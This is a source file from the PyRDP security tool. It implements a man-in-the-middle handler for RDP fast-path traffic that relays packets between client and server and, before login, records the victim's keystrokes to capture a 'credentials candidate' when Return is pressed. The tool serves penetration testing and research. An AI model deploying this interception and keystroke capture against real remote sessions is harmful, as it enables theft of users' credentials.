#
# This file is part of the PyRDP project.
# Copyright (C) 2019 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

from pyrdp.layer import FastPathLayer
from pyrdp.mitm.state import RDPMITMState
from pyrdp.pdu import FastPathPDU, FastPathScanCodeEvent
from pyrdp.player import keyboard
from pyrdp.enum import ScanCode


class FastPathMITM:
    """
    MITM component for the fast-path layer.
    """

    def __init__(self, client: FastPathLayer, server: FastPathLayer, state: RDPMITMState):
        """
        :param client: fast-path layer for the client side
        :param server: fast-path layer for the server side
        :param state: the MITM state.
        """

        self.client = client
        self.server = server
        self.state = state

        self.client.createObserver(
            onPDUReceived = self.onClientPDUReceived,
        )

        self.server.createObserver(
            onPDUReceived = self.onServerPDUReceived,
        )

    def onClientPDUReceived(self, pdu: FastPathPDU):
        if self.state.forwardInput:
            self.server.sendPDU(pdu)

        if not self.state.loggedIn:
            for event in pdu.events:
                if isinstance(event, FastPathScanCodeEvent):
                    self.onScanCode(event.scanCode, event.isReleased, event.rawHeaderByte & keyboard.KBDFLAGS_EXTENDED != 0)

    def onServerPDUReceived(self, pdu: FastPathPDU):
        if self.state.forwardOutput:
            self.client.sendPDU(pdu)

    def onScanCode(self, scanCode: int, isReleased: bool, isExtended: bool):
        """
        Handle scan code.
        """
        keyName = keyboard.getKeyName(scanCode, isExtended, self.state.shiftPressed, self.state.capsLockOn)
        scanCodeTuple = (scanCode, isExtended)

        # Left or right shift
        if scanCodeTuple in [ScanCode.LSHIFT, ScanCode.RSHIFT]:
            self.state.shiftPressed = not isReleased
        # Caps lock
        elif scanCodeTuple == ScanCode.CAPSLOCK and not isReleased:
            self.state.capsLockOn = not self.state.capsLockOn
        # Control
        elif scanCodeTuple in [ScanCode.LCONTROL, ScanCode.RCONTROL]:
            self.state.ctrlPressed = not isReleased
        # Backspace
        elif scanCodeTuple == ScanCode.BACKSPACE and not isReleased:
            self.state.inputBuffer += "<\\b>"
        # Tab
        elif scanCodeTuple == ScanCode.TAB and not isReleased:
            self.state.inputBuffer += "<\\t>"
        # CTRL + A
        elif scanCodeTuple == ScanCode.KEY_A and self.state.ctrlPressed and not isReleased:
            self.state.inputBuffer += "<ctrl-a>"
        # Return
        elif scanCodeTuple == ScanCode.RETURN and not isReleased:
            self.state.credentialsCandidate = self.state.inputBuffer
            self.state.inputBuffer = ""
        # Normal input
        elif len(keyName) == 1:
            if not isReleased:
                self.state.inputBuffer += keyName